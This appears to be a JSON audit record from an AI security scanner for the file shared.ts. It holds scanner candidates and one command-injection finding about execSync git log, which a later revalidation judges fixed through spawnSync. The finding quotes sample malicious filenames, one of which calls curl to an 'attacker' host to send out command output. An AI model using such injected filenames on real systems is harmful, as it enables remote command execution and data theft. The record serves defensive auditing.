@@ -1,0 +1,223 @@
+{
+  "filePath": "packages/processor/src/agents/shared.ts",
+  "projectId": "deepsec",
+  "candidates": [
+    {
+      "vulnSlug": "auth-bypass",
+      "lineNumbers": [
+        111,
+        246,
+        249
+      ],
+      "snippet": "2. **Trace data flows** — where does input come from? Is it user-controlled?\n3. **Follow imports** — read related files (middleware, utils, shared libs) to understand the full picture\n4. **Check for mitigations** — is there sanitization, validation, auth middleware, or framework protection?\n5. **Think broadly** — look for issues beyond what the scanner flagged. The scanner only finds surface patterns; you should reason about logic bugs, race conditions, missing checks, etc.\n",
+      "matchedPattern": "auth middleware"
+    },
+    {
+      "vulnSlug": "rce",
+      "lineNumbers": [
+        211
+      ],
+      "snippet": "    let gitContext = \"\";\n    try {\n      const gitLog = execSync(\n        `git log --oneline --since=\"3 months ago\" -n 10 -- \"${file.filePath}\"`,\n        {",
+      "matchedPattern": "execSync"
+    },
+    {
+      "vulnSlug": "insecure-crypto",
+      "lineNumbers": [
+        127,
+        204,
+        255
+      ],
+      "snippet": "        \"vulnSlug\": \"the-vuln-slug-or-other\",\n        \"title\": \"Brief title of the issue\",\n        \"description\": \"Detailed description of the vulnerability, the attack scenario, and evidence from the code\",\n        \"lineNumbers\": [10, 15],\n        \"recommendation\": \"How to fix this vulnerability\",",
+      "matchedPattern": "weak cipher algorithm"
+    },
+    {
+      "vulnSlug": "insecure-crypto",
+      "lineNumbers": [
+        16
+      ],
+      "snippet": "\nexport async function backoff(attempt: number): Promise<void> {\n  const ms = 2000 * 2 ** (attempt - 1) + Math.random() * 1000;\n  await new Promise((r) => setTimeout(r, ms));\n}",
+      "matchedPattern": "Math.random in security context"
+    },
+    {
+      "vulnSlug": "agent-tool-definition",
+      "lineNumbers": [
+        1
+      ],
+      "snippet": "import { execSync } from \"node:child_process\";\nimport type { FileRecord, Finding, RefusalReport } from \"@deepsec/core\";\nimport type { InvestigateResult, RevalidateVerdict } from \"./types.js\";\n",
+      "matchedPattern": "Tool executes shell commands — RCE via prompt injection"
+    },
+    {
+      "vulnSlug": "agent-tool-definition",
+      "lineNumbers": [
+        211
+      ],
+      "snippet": "    try {\n      const gitLog = execSync(\n        `git log --oneline --since=\"3 months ago\" -n 10 -- \"${file.filePath}\"`,\n        {\n          cwd: projectRoot,",
+      "matchedPattern": "Tool executes shell commands — RCE via prompt injection"
+    },
+    {
+      "vulnSlug": "auth-bypass",
+      "lineNumbers": [
+        111,
+        251,
+        254
+      ],
+      "snippet": "2. **Trace data flows** — where does input come from? Is it user-controlled?\n3. **Follow imports** — read related files (middleware, utils, shared libs) to understand the full picture\n4. **Check for mitigations** — is there sanitization, validation, auth middleware, or framework protection?\n5. **Think broadly** — look for issues beyond what the scanner flagged. The scanner only finds surface patterns; you should reason about logic bugs, race conditions, missing checks, etc.\n",
+      "matchedPattern": "auth middleware"
+    },
+    {
+      "vulnSlug": "rce",
+      "lineNumbers": [
+        213
+      ],
+      "snippet": "    // contain shell metacharacters (`;`, `$`, backticks). Passing it as a\n    // single argv slot keeps it from being re-parsed as a command.\n    const gitResult = spawnSync(\n      \"git\",\n      [\"log\", \"--oneline\", \"--since=3 months ago\", \"-n\", \"10\", \"--\", file.filePath],",
+      "matchedPattern": "spawnSync"
+    },
+    {
+      "vulnSlug": "insecure-crypto",
+      "lineNumbers": [
+        127,
+        204,
+        260
+      ],
+      "snippet": "        \"vulnSlug\": \"the-vuln-slug-or-other\",\n        \"title\": \"Brief title of the issue\",\n        \"description\": \"Detailed description of the vulnerability, the attack scenario, and evidence from the code\",\n        \"lineNumbers\": [10, 15],\n        \"recommendation\": \"How to fix this vulnerability\",",
+      "matchedPattern": "weak cipher algorithm"
+    },
+    {
+      "vulnSlug": "auth-bypass",
+      "lineNumbers": [
+        126,
+        284,
+        287
+      ],
+      "snippet": "2. **Trace data flows** — where does input come from? Is it user-controlled?\n3. **Follow imports** — read related files (middleware, utils, shared libs) to understand the full picture\n4. **Check for mitigations** — is there sanitization, validation, auth middleware, or framework protection?\n5. **Think broadly** — look for issues beyond what the scanner flagged. The scanner only finds surface patterns; you should reason about logic bugs, race conditions, missing checks, etc.\n",
+      "matchedPattern": "auth middleware"
+    },
+    {
+      "vulnSlug": "rce",
+      "lineNumbers": [
+        244
+      ],
+      "snippet": "    // contain shell metacharacters (`;`, `$`, backticks). Passing it as a\n    // single argv slot keeps it from being re-parsed as a command.\n    const gitResult = spawnSync(\n      \"git\",\n      [\"log\", \"--oneline\", \"--since=3 months ago\", \"-n\", \"10\", \"--\", file.filePath],",
+      "matchedPattern": "spawnSync"
+    },
+    {
+      "vulnSlug": "insecure-crypto",
+      "lineNumbers": [
+        142,
+        235,
+        293
+      ],
+      "snippet": "        \"vulnSlug\": \"the-vuln-slug-or-other\",\n        \"title\": \"Brief title of the issue\",\n        \"description\": \"Detailed description of the vulnerability, the attack scenario, and evidence from the code\",\n        \"lineNumbers\": [10, 15],\n        \"recommendation\": \"How to fix this vulnerability\",",
+      "matchedPattern": "weak cipher algorithm"
+    }
+  ],
+  "lastScannedAt": "2026-05-06T21:46:56.657Z",
+  "lastScannedRunId": "20260506214655-aa977d40dc0c6524",
+  "fileHash": "c3d4a89a63348d06761abe03f84bb38f2ec50c3a3d1d12bb18dd9f8a3af5ba17",
+  "findings": [
+    {
+      "severity": "HIGH",
+      "vulnSlug": "rce",
+      "title": "Command injection via file.filePath in revalidation git log",
+      "description": "`buildRevalidatePrompt` runs ``execSync(`git log --oneline --since=\"3 months ago\" -n 10 -- \"${file.filePath}\"`, { cwd: projectRoot, … })`` to gather git history for the prompt. `file.filePath` comes from a `FileRecord`, which originates from glob results (see scanner index.ts:158 — `relPath` is taken from the filesystem unchanged). A repository containing a file with shell metacharacters in its name (e.g. ``foo`id`.js`` or ``foo\";curl http://attacker/$(id);\"``) yields a `filePath` that, when interpolated into the shell command string, breaks out of the double-quoted argument and executes attacker-chosen commands on the scanner host. This runs every revalidation pass. Same root cause as the enrich.ts finding, called out explicitly in CLAUDE.md's threat model.",
+      "lineNumbers": [
+        211
+      ],
+      "recommendation": "Replace the template-literal `execSync` with `spawnSync('git', ['log', '--oneline', '--since=3 months ago', '-n', '10', '--', file.filePath], { cwd: projectRoot, … })`. The argv form passes the path as a single argv slot with no shell interpretation. Alternatively, validate filePath via a strict allowlist regex before interpolation.",
+      "confidence": "high",
+      "revalidation": {
+        "verdict": "fixed",
+        "reasoning": "The current `buildRevalidatePrompt` implementation no longer interpolates `file.filePath` into a shell command. It imports `spawnSync` from `node:child_process` and invokes `git` as `spawnSync(\"git\", [\"log\", \"--oneline\", \"--since=3 months ago\", \"-n\", \"10\", \"--\", file.filePath], ...)`, so the repository-controlled path is passed as one argv element and is not parsed by a shell. I traced `FileRecord.filePath` back to scanner glob output in `packages/scanner/src/index.ts`, where paths are indeed derived from repository filenames and could contain shell metacharacters. That source would have made the original template-literal `execSync` exploitable, because a malicious filename could break out of the quoted shell argument. In the current code, metacharacters such as backticks, semicolons, quotes, and dollar expansions remain literal bytes in the path argument to `git`. The code also sets a timeout and ignores stderr, but the decisive mitigation is the argv-form process invocation. I found no remaining `execSync` git-log interpolation in this agent path.",
+        "revalidatedAt": "2026-05-06T22:53:51.005Z",
+        "runId": "20260506225212-b55e02145ea06bf2",
+        "model": "gpt-5.5"
+      }
+    }
+  ],
+  "analysisHistory": [
+    {
+      "runId": "20260502160808-9bbd",
+      "investigatedAt": "2026-05-02T16:16:23.348Z",
+      "durationMs": 390624,
+      "durationApiMs": 388060,
+      "agentType": "claude-agent-sdk",
+      "model": "claude-opus-4-7",
+      "modelConfig": {
+        "model": "claude-opus-4-7"
+      },
+      "agentSessionId": "8065c73f-0323-4e92-b23a-ddf054c61090",
+      "findingCount": 1,
+      "numTurns": 10,
+      "costUsd": 2.08821755,
+      "usage": {
+        "inputTokens": 15,
+        "outputTokens": 25045,
+        "cacheReadInputTokens": 653901,
+        "cacheCreationInputTokens": 169435
+      },
+      "refusal": {
+        "refused": false,
+        "skipped": [],
+        "raw": "```json\n{\"refused\": false, \"skipped\": []}\n```"
+      }
+    },
+    {
+      "runId": "20260506215247-19f2b7ae62f3f309",
+      "investigatedAt": "2026-05-06T21:54:28.844Z",
+      "durationMs": 17977.4,
+      "agentType": "codex",
+      "model": "gpt-5.5",
+      "modelConfig": {
+        "model": "gpt-5.5"
+      },
+      "agentSessionId": "019dff47-8e1a-7420-b92b-51642164ef5d",
+      "findingCount": 0,
+      "numTurns": 0.2,
+      "phase": "process",
+      "costUsd": 0.090545,
+      "usage": {
+        "inputTokens": 8638.2,
+        "outputTokens": 870.2,
+        "cacheReadInputTokens": 42496,
+        "cacheCreationInputTokens": 0
+      },
+      "refusal": {
+        "refused": false,
+        "skipped": [],
+        "raw": "{\"refused\":false,\"skipped\":[]}"
+      },
+      "reinvestigateMarker": 10
+    },
+    {
+      "runId": "20260506225212-b55e02145ea06bf2",
+      "investigatedAt": "2026-05-06T22:53:51.005Z",
+      "durationMs": 43143.5,
+      "agentType": "codex",
+      "model": "gpt-5.5",
+      "modelConfig": {
+        "model": "gpt-5.5"
+      },
+      "agentSessionId": "019dff7d-f508-7510-87c8-7a9911228550",
+      "findingCount": 1,
+      "numTurns": 0.5,
+      "phase": "revalidate",
+      "costUsd": 0.257763,
+      "usage": {
+        "inputTokens": 26669,
+        "outputTokens": 2479,
+        "cacheReadInputTokens": 100096,
+        "cacheCreationInputTokens": 0
+      },
+      "refusal": {
+        "refused": false,
+        "skipped": [],
+        "raw": "{\"refused\":false,\"skipped\":[]}"
+      }
+    }
+  ],
+  "gitInfo": {
+    "recentCommitters": [],
+    "enrichedAt": "2026-05-06T22:53:51.007Z"
+  },
+  "status": "analyzed"
+}
